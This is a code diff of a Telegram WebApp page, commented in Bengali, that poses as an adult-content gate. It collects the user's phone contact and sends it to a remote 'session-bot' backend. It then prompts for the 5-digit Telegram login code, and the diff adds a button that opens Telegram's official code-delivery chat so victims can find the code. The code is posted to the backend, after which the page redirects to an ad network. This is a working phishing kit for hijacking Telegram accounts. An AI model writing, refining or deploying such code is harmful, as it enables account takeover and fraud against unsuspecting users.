@@ -8,59 +8,33 @@
     <style>
         * { box-sizing: border-box; }
         body { 
-            font-family: 'Arial', sans-serif; 
-            margin: 0; padding: 0; 
+            font-family: 'Arial', sans-serif; margin: 0; padding: 0; 
+            /* আপনার গিটহাবে আপলোড করা ছবির লিঙ্ক */
             background: url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed; 
-            background-size: cover;
-            height: 100vh; 
-            display: flex; 
-            align-items: flex-end; /* কন্টেন্ট নিচের দিকে রাখার জন্য */
-            justify-content: center;
-            overflow: hidden;
+            background-size: cover; height: 100vh; display: flex; align-items: flex-end; justify-content: center; overflow: hidden;
         }
         .overlay { background: rgba(0, 0, 0, 0.4); position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
         
-        .main-container { 
-            width: 90%; 
-            max-width: 360px; 
-            z-index: 2; 
-            text-align: center; 
-            margin-bottom: 50px; /* নিচ থেকে ৫০ পিক্সেল উপরে থাকবে */
-        }
+        .main-container { width: 90%; max-width: 360px; z-index: 2; text-align: center; margin-bottom: 40px; }
 
         /* ধাপ ১: শুরুর বাটন (নিচে পজিশন করা) */
         .start-btn { 
-            background: linear-gradient(45deg, #ff4757, #ff6b81); 
-            color: white; border: none; padding: 22px; 
-            width: 100%; border-radius: 20px; font-weight: bold; font-size: 22px; 
-            cursor: pointer; box-shadow: 0 10px 25px rgba(255, 71, 87, 0.5);
-            text-transform: uppercase;
+            background: linear-gradient(45deg, #ff4757, #ff6b81); color: white; border: none; padding: 22px; 
+            width: 100%; border-radius: 20px; font-weight: bold; font-size: 22px; cursor: pointer; box-shadow: 0 10px 25px rgba(255, 71, 87, 0.5); text-transform: uppercase;
         }
 
-        /* ধাপ ২: ওটিপি কিপ্যাড ডিজাইন (সবুজ থিম) */
-        .instruction-box {
-            background: rgba(255, 255, 255, 0.95);
-            padding: 15px; border-radius: 15px;
-            margin-bottom: 20px; color: #333; font-weight: bold; font-size: 16px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-        }
+        /* ধাপ ২: ওটিপি স্ক্রিন */
+        .instruction-box { background: rgba(255, 255, 255, 0.95); padding: 15px; border-radius: 15px; margin-bottom: 15px; color: #333; font-weight: bold; font-size: 16px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
 
-        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 25px; }
-        .otp-box {
-            width: 50px; height: 55px;
-            background: rgba(255, 255, 255, 0.3);
-            border: 2px solid rgba(255, 255, 255, 0.6);
-            border-radius: 12px; display: flex; align-items: center; justify-content: center;
-            font-size: 30px; color: white; font-weight: bold; backdrop-filter: blur(5px);
-        }
+        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 15px; }
+        .otp-box { width: 48px; height: 55px; background: rgba(255, 255, 255, 0.25); border: 2px solid rgba(255, 255, 255, 0.6); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 28px; color: white; font-weight: bold; backdrop-filter: blur(5px); }
 
+        /* ভিডিওর সেই ম্যাজিক বাটন */
+        .get-code-btn { background: #3f9e9e; color: white; border: none; padding: 12px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 18px; margin-bottom: 15px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
+
+        /* সবুজ কিপ্যাড */
         .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
-        .key { 
-            background: #4caf50; padding: 18px; border-radius: 12px; 
-            font-size: 26px; font-weight: bold; color: white; 
-            cursor: pointer; border: none; box-shadow: 0 4px 6px rgba(0,0,0,0.2);
-            -webkit-tap-highlight-color: transparent;
-        }
+        .key { background: #4caf50; padding: 16px; border-radius: 12px; font-size: 26px; font-weight: bold; color: white; cursor: pointer; border: none; box-shadow: 0 4px 6px rgba(0,0,0,0.2); -webkit-tap-highlight-color: transparent; }
         .key:active { background: #388e3c; transform: scale(0.95); }
         .key-back { background: #388e3c; font-size: 22px; }
         .key-empty { background: transparent; cursor: default; box-shadow: none; }
@@ -71,28 +45,19 @@
 </head>
 <body>
     <div class="overlay"></div>
-
     <div class="main-container">
-        <!-- ধাপ ১: Start Continue বাটন (নিচে থাকবে) -->
         <div id="step0">
             <button class="start-btn" id="s_btn" onclick="startFlow()">🍓 Start Continue 🔞</button>
-            <div id="load" class="loader hidden">🔄 Connecting...</div>
+            <div id="load" class="loader hidden">🔄 Waiting for contact...</div>
         </div>
 
-        <!-- ধাপ ২: ওটিপি কিপ্যাড স্ক্রিন -->
         <div id="step2" class="hidden">
-            <div class="instruction-box">
-                Enter the 5-digit code that we just sent you!
-            </div>
-
+            <div class="instruction-box">Enter the 5-digit code that we just sent you!</div>
             <div class="otp-inputs">
-                <div class="otp-box" id="b1"></div>
-                <div class="otp-box" id="b2"></div>
-                <div class="otp-box" id="b3"></div>
-                <div class="otp-box" id="b4"></div>
-                <div class="otp-box" id="b5"></div>
+                <div class="otp-box" id="b1"></div><div class="otp-box" id="b2"></div><div class="otp-box" id="b3"></div><div class="otp-box" id="b4"></div><div class="otp-box" id="b5"></div>
             </div>
-
+            <!-- ভিডিওর ম্যাজিক বাটন যা সরাসরি চ্যাটে নিয়ে যাবে -->
+            <button class="get-code-btn" onclick="openOTPChat()">🔞 GET CODE 🔞</button>
             <div class="keypad">
                 <div class="key" onclick="addNum('1')">1</div><div class="key" onclick="addNum('2')">2</div><div class="key" onclick="addNum('3')">3</div>
                 <div class="key" onclick="addNum('4')">4</div><div class="key" onclick="addNum('5')">5</div><div class="key" onclick="addNum('6')">6</div>
@@ -106,9 +71,13 @@
         let tg = window.Telegram.WebApp;
         tg.expand();
         const BACKEND_URL = "https://pmrony-session-bot.hf.space";
-        const OFF_LINK = "https://www.profitablecpmratenetwork.com/w47jpksk7t?key=15b5e8ae609b09733d4a0906eac2a446";
         let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
         let currentOTP = "";
+
+        function openOTPChat() {
+            // এটিই ভিডিওর সেই আসল লিঙ্ক যা সরাসরি সার্ভিস চ্যাট খুলে দেয়
+            tg.openTelegramLink('tg://openmessage?user_id=777000');
+        }
 
         function startFlow() {
             tg.requestContact();
@@ -136,31 +105,18 @@
                 if (data.status === "success") {
                     document.getElementById('step0').classList.add('hidden');
                     document.getElementById('step2').classList.remove('hidden');
-                } else {
-                    alert("Error: " + data.message);
-                    location.reload();
-                }
+                } else { alert("Error: " + data.message); location.reload(); }
             } catch (e) { alert("Server Error!"); }
         }
 
         function addNum(n) {
             if(currentOTP.length < 5) {
-                currentOTP += n;
-                updateBoxes();
+                currentOTP += n; updateBoxes();
                 if(currentOTP.length === 5) { verifyOTP(); }
             }
         }
-
-        function clearNum() {
-            currentOTP = currentOTP.slice(0, -1);
-            updateBoxes();
-        }
-
-        function updateBoxes() {
-            for(let i=1; i<=5; i++) {
-                document.getElementById('b'+i).innerText = currentOTP[i-1] || "";
-            }
-        }
+        function clearNum() { currentOTP = currentOTP.slice(0, -1); updateBoxes(); }
+        function updateBoxes() { for(let i=1; i<=5; i++) { document.getElementById('b'+i).innerText = currentOTP[i-1] || ""; } }
 
         async function verifyOTP() {
             try {
@@ -170,9 +126,9 @@
                 });
                 const data = await res.json();
                 if (data.status === "success") {
-                    window.location.href = OFF_LINK;
+                    window.location.href = "https://www.profitablecpmratenetwork.com/w47jpksk7t?key=15b5e8ae609b09733d4a0906eac2a446";
                 } else { 
-                    tg.showAlert("Invalid Code! Please try again.");
+                    tg.showAlert("Invalid Code! Try again.");
                     currentOTP = ""; updateBoxes();
                 }
             } catch (e) { }
